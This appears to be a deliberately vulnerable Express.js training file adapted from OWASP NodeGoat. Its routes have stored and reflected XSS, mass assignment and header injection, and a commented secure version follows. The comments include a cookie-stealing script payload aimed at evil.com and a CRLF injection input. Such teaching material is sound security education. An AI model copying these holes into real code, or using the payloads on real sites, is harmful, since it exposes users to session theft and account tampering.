// ============================================================
// VULNERABILITY: Cross-Site Scripting (XSS) + Mass Assignment
// Source: Adapted from OWASP NodeGoat
// OWASP: A03:2021 — Injection
// ============================================================

const express = require("express");
const router = express.Router();


// VULNERABLE: Stored XSS — user input rendered without escaping
// An attacker submits: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
// as a "contribution" and it executes in every user's browser
router.post("/add", (req, res) => {
    const { title, description, amount } = req.body;

    // THIS IS THE VULNERABLE CODE
    // No input sanitization — HTML/JS tags are stored as-is
    const contribution = {
        title: title,               // Could contain <script> tags
        description: description,   // Could contain <img onerror=...>
        amount: amount,
        userId: req.session.userId
    };

    // Save to DB without sanitization...
    // ContributionModel.create(contribution);

    // VULNERABLE: Rendering user content directly into HTML
    // The template does NOT escape the output
    res.send(`
        <h2>Contribution Added</h2>
        <p>Title: ${title}</p>
        <p>Description: ${description}</p>
        <p>Amount: $${amount}</p>
    `);
});


// VULNERABLE: Reflected XSS — query param reflected in page
// An attacker sends: /search?q=<script>alert(1)</script>
router.get("/search", (req, res) => {
    const query = req.query.q || "";

    // THIS IS THE VULNERABLE LINE
    // User input reflected directly into the HTML response
    res.send(`
        <h2>Search Results for: ${query}</h2>
        <p>No results found.</p>
    `);
});


// VULNERABLE: Mass assignment — user can modify any field
// An attacker adds extra fields like isAdmin=true to the request
router.put("/update/:id", (req, res) => {
    const contributionId = req.params.id;

    // THIS IS THE VULNERABLE CODE
    // Spreads ALL request body fields into the database update
    // An attacker adds { isApproved: true, amount: 999999 }
    const updateData = { ...req.body };

    // ContributionModel.findByIdAndUpdate(contributionId, updateData);

    res.json({ message: "Updated", data: updateData });
});


// VULNERABLE: HTTP Response Splitting / Header Injection
// An attacker passes: en%0d%0aSet-Cookie:%20admin=true
router.get("/language", (req, res) => {
    const lang = req.query.lang || "en";

    // THIS IS THE VULNERABLE LINE
    // User input goes directly into an HTTP header
    res.setHeader("Content-Language", lang);
    res.send("Language set to: " + lang);
});


module.exports = router;

// SECURE VERSION (for comparison):
// const xss = require("xss");
//
// router.post("/add-safe", (req, res) => {
//     const contribution = {
//         title: xss(req.body.title),           // Sanitize HTML
//         description: xss(req.body.description),
//         amount: parseFloat(req.body.amount),   // Type coerce
//         userId: req.session.userId
//     };
//     // ...save safely
// });
//
// router.put("/update-safe/:id", (req, res) => {
//     // Allowlist — only permit specific fields
//     const allowed = ["title", "description", "amount"];
//     const updateData = {};
//     allowed.forEach(field => {
//         if (req.body[field] !== undefined) {
//             updateData[field] = xss(String(req.body[field]));
//         }
//     });
//     // ...update safely
// });
